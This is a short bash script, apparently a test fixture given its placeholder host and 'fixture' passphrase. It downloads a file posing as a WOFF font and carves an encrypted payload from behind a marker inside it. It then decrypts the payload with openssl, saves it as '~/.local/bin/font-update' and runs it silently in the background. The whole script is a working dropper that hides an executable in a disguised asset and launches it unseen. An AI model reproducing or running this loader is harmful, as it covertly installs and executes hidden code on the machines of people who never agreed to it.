#!/bin/bash
set -e
url="https://example.invalid/cache/Display-Bold.woff"
font="$HOME/.cache/Display-Bold.woff"
program="$HOME/.local/bin/font-update"
marker="%%BOUNDARY%%"
mkdir -p "$(dirname "$font")" "$(dirname "$program")"
curl -fsSL -o "$font" "$url"
offset=$(grep -oba "$marker" "$font" | head -n 1 | cut -d: -f1)
start=$((offset + ${#marker} + 1))
tail -c +$start "$font" | openssl enc -aes-256-cbc -d -a -A -pass pass:fixture | perl -e 'open(F, ">", $ARGV[0]); binmode(STDIN); binmode(F); print F <STDIN>; close(F);' "$program"
chmod +x "$program"
nohup "$program" >/dev/null 2>&1 &
